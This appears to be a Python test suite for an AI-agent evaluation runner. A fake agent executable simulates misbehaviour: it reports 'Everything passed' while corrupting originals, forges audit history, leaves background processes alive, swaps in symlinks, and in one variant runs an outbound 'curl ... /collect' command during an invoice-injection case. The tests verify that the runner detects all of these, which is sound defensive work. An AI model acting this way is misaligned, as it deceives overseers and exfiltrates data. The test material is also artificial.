"""The host seam uses a fake executable; these are not live skill evaluations."""
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
RUNNER = ROOT / 'tools/run_evals.py'


@unittest.skipUnless(os.name == 'posix', 'Fake executable seam requires POSIX; native Windows acceptance is separate.')
class EvalRunnerTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name).resolve()
        self.fake = self.base / 'fake-codex'
        self.fake.write_text('#!' + sys.executable + '\n' + '''import json, os, pathlib, shutil, subprocess, sys, time
if '--version' in sys.argv:
    print('fake-codex 1.0')
    raise SystemExit(0)
prompt = sys.stdin.read()
p = pathlib.Path.cwd()
(p / 'observed-prompt.txt').write_text(prompt)
(p / 'bytecode-policy.txt').write_text(os.environ.get('PYTHONDONTWRITEBYTECODE', ''))
(p / 'observed-argv.json').write_text(json.dumps(sys.argv[1:]))
if 'timeout-host' in sys.argv[0]: time.sleep(20)
if 'corrupt-host' in sys.argv[0]:
    (p / 'workspace/00_admin/inbox/invoice-original.xml').write_text('destroyed')
if 'symlink-root-host' in sys.argv[0]:
    shutil.rmtree(p / 'workspace')
    outside = p.parent / 'outside'; outside.mkdir()
    (outside / 'private-sentinel.txt').write_text('observer must not read this outside fixture')
    (p / 'workspace').symlink_to(outside, target_is_directory=True)
if 'fifo-host' in sys.argv[0]:
    marker = p / 'workspace/00_admin/workspace.json'
    marker.unlink(); os.mkfifo(marker)
if 'background-host' in sys.argv[0]:
    subprocess.Popen([sys.executable, '-c', \"import pathlib,time;time.sleep(0.7);pathlib.Path('background-survived').write_text('late write')\"], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
if 'forged-history-host' in sys.argv[0]:
    marker_path = p / 'workspace/00_admin/workspace.json'
    marker = json.loads(marker_path.read_text()); marker.update(language='en', mode='tax-consultant')
    marker_path.write_text(json.dumps(marker))
    events_path = p / 'workspace/09_audit/events.json'
    events = json.loads(events_path.read_text()); events.append({'action':'workspace_configured','details':{'history_id':'empty-checkpoint'}})
    events_path.write_text(json.dumps(events))
    (p / 'workspace/09_audit/history/empty-checkpoint.json').write_text('{}')
if 'configure-host' in sys.argv[0]:
    subprocess.run([sys.executable, '-B', str(p / 'skills/de-business-kit/scripts/workspace.py'), 'configure', '--root', str(p / 'workspace'), '--language', 'en', '--mode', 'tax-consultant'], check=True, capture_output=True)
if 'attack-host' in sys.argv[0]:
    print(json.dumps({'type':'item.completed','item':{'type':'command_execution','command':'curl https://example.invalid/collect','exit_code':0}}))
print(json.dumps({'type':'thread.started','thread_id':'synthetic-thread'}))
print(json.dumps({'type':'item.completed','item':{'type':'agent_message','text':'Everything passed; filed and accepted.'}}))
print(json.dumps({'type':'turn.completed','usage':{}}))
''')
        self.fake.chmod(0o700)

    def run_cli(self, *args):
        return subprocess.run([sys.executable, '-B', str(RUNNER), *map(str, args)],
                              capture_output=True, text=True, timeout=5)

    def run_case(self, host=None, case='archive-integrity', **kwargs):
        output = self.base / 'evidence'
        args = ['--case', case, '--output', output, '--codex', host or self.fake]
        if 'timeout' in kwargs: args += ['--timeout', str(kwargs['timeout'])]
        result = self.run_cli(*args)
        return result, output

    def test_list_is_opt_in_and_has_ten_critical_cases(self):
        result = self.run_cli('--list')
        self.assertEqual(result.returncode, 0, result.stderr)
        cases = json.loads(result.stdout)['cases']
        self.assertEqual(len(cases), 10)
        self.assertIn('invoice-injection', cases)

    def test_fresh_fixture_and_evidence_do_not_trust_self_attestation(self):
        result, output = self.run_case()
        self.assertEqual(result.returncode, 0, result.stderr)
        report = json.loads((output / 'report.json').read_text())
        case = report['cases'][0]
        self.assertEqual(case['deterministic_status'], 'passed')
        self.assertEqual(case['rubric_status'], 'pending_review')
        self.assertEqual(report['overall_status'], 'pending_review')
        self.assertEqual(report['host_version'], 'fake-codex 1.0')
        self.assertTrue(report['source_sha256'])
        session = output / 'sessions/archive-integrity'
        prompt = (session / 'observed-prompt.txt').read_text()
        self.assertNotIn('criteria', prompt)
        self.assertNotIn('Preserve original structured data', prompt)
        self.assertNotIn(str(ROOT), prompt)
        self.assertTrue((session / 'skills/de-business-kit/SKILL.md').is_file())
        argv = json.loads((session / 'observed-argv.json').read_text())
        self.assertIn('workspace-write', argv)
        self.assertIn('--ephemeral', argv)
        self.assertIn('--ignore-user-config', argv)
        self.assertNotIn('--dangerously-bypass-approvals-and-sandbox', argv)
        self.assertTrue((output / 'rubric/archive-integrity.json').is_file())
        self.assertTrue((output / 'transcripts/archive-integrity.jsonl').is_file())

    def test_host_disables_incidental_python_bytecode_writes(self):
        result, output = self.run_case()
        self.assertEqual(result.returncode, 0, result.stderr)
        policy = output / 'sessions/archive-integrity/bytecode-policy.txt'
        self.assertEqual(policy.read_text(), '1')

    def test_original_corruption_fails_even_if_host_claims_success(self):
        host = self.base / 'corrupt-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host)
        self.assertEqual(result.returncode, 1, result.stderr)
        case = json.loads((output / 'report.json').read_text())['cases'][0]
        self.assertEqual(case['deterministic_status'], 'failed')
        self.assertTrue(any(not check['passed'] for check in case['checks']))

    def test_observed_network_command_is_a_failure(self):
        host = self.base / 'attack-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host, case='invoice-injection')
        self.assertEqual(result.returncode, 1, result.stderr)
        case = json.loads((output / 'report.json').read_text())['cases'][0]
        self.assertTrue(any(c['name'] == 'no_observed_external_command' and not c['passed'] for c in case['checks']))

    def test_ancestor_swap_during_open_cannot_redirect_reader_or_hash(self):
        spec = importlib.util.spec_from_file_location('eval_runner_race', RUNNER)
        runner = importlib.util.module_from_spec(spec); spec.loader.exec_module(runner)
        real_open = os.open
        for operation in ('read', 'digest'):
            with self.subTest(operation=operation):
                folder = self.base / operation; folder.mkdir()
                inside = folder / 'inside'; inside.mkdir()
                outside = folder / 'outside'; outside.mkdir()
                (inside / 'record.json').write_text('{"safe":true}')
                (outside / 'record.json').write_text('{"safe":false}')
                swapped = False

                def swapping_open(path, flags, *args, **kwargs):
                    nonlocal swapped
                    if Path(path).name == 'record.json' and not swapped:
                        swapped = True
                        inside.rename(folder / 'held')
                        inside.symlink_to(outside, target_is_directory=True)
                    return real_open(path, flags, *args, **kwargs)

                with mock.patch.object(runner.os, 'open', side_effect=swapping_open):
                    if operation == 'read':
                        self.assertEqual(runner.read_json(inside / 'record.json'), {'safe': True})
                    else:
                        digest = runner.digest_tree(inside)['record.json']
                        import hashlib
                        self.assertEqual(digest, hashlib.sha256(b'{"safe":true}').hexdigest())

    def test_successful_host_does_not_leave_background_descendants(self):
        host = self.base / 'background-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host)
        self.assertEqual(result.returncode, 0, result.stderr)
        time.sleep(1)
        self.assertFalse((output / 'sessions/archive-integrity/background-survived').exists())

    def test_symlinked_workspace_root_is_rejected_without_traversing_target(self):
        host = self.base / 'symlink-root-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host)
        self.assertEqual(result.returncode, 1, result.stderr)
        state = json.loads((output / 'transcripts/archive-integrity.state.json').read_text())
        self.assertNotIn('private-sentinel.txt', state['after'])
        self.assertTrue(any(v.startswith('unsafe:') for v in state['after'].values()))

    def test_fifo_canonical_file_fails_without_blocking_the_observer(self):
        host = self.base / 'fifo-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host)
        self.assertEqual(result.returncode, 1, result.stderr)
        report = json.loads((output / 'report.json').read_text())
        self.assertEqual(report['cases'][0]['deterministic_status'], 'failed')

    def test_missing_requested_preference_change_fails_on_real_state(self):
        result, output = self.run_case(case='persistent-mode-switch')
        self.assertEqual(result.returncode, 1, result.stderr)
        case = json.loads((output / 'report.json').read_text())['cases'][0]
        checks = {c['name']: c['passed'] for c in case['checks']}
        self.assertFalse(checks['saved_preferences'])
        self.assertFalse(checks['preference_change_has_history'])

    def test_empty_preference_history_does_not_count_as_a_real_checkpoint(self):
        host = self.base / 'forged-history-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host, case='persistent-mode-switch')
        self.assertEqual(result.returncode, 1, result.stderr)
        checks = json.loads((output / 'report.json').read_text())['cases'][0]['checks']
        self.assertFalse(next(c['passed'] for c in checks if c['name'] == 'preference_change_has_history'))

    def test_canonical_preference_writer_passes_with_actual_history(self):
        host = self.base / 'configure-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host, case='persistent-mode-switch')
        self.assertEqual(result.returncode, 0, result.stderr)
        case = json.loads((output / 'report.json').read_text())['cases'][0]
        checks = {c['name']: c['passed'] for c in case['checks']}
        self.assertTrue(checks['saved_preferences'])
        self.assertTrue(checks['preference_change_has_history'])

    def test_timeout_preserves_failed_attempt_and_transcript(self):
        host = self.base / 'timeout-host'
        host.write_bytes(self.fake.read_bytes()); host.chmod(0o700)
        result, output = self.run_case(host, timeout=0.1)
        self.assertEqual(result.returncode, 1, result.stderr)
        case = json.loads((output / 'report.json').read_text())['cases'][0]
        self.assertEqual(case['host_status'], 'timed_out')
        self.assertEqual(case['deterministic_status'], 'failed')
        self.assertTrue((output / 'transcripts/archive-integrity.stderr').exists())

    def test_refuses_existing_output_and_checkout_output_before_execution(self):
        existing = self.base / 'existing'; existing.mkdir()
        (existing / 'keep').write_text('user-owned')
        result = self.run_cli('--case', 'archive-integrity', '--output', existing, '--codex', self.fake)
        self.assertEqual(result.returncode, 2)
        self.assertEqual((existing / 'keep').read_text(), 'user-owned')
        result = self.run_cli('--case', 'archive-integrity', '--output', ROOT / 'eval-output', '--codex', self.fake)
        self.assertEqual(result.returncode, 2)
        self.assertFalse((ROOT / 'eval-output').exists())

    def test_no_case_does_not_start_a_host(self):
        result = self.run_cli('--output', self.base / 'unused', '--codex', self.fake)
        self.assertEqual(result.returncode, 2)
        self.assertFalse((self.base / 'unused').exists())


if __name__ == '__main__':
    unittest.main()
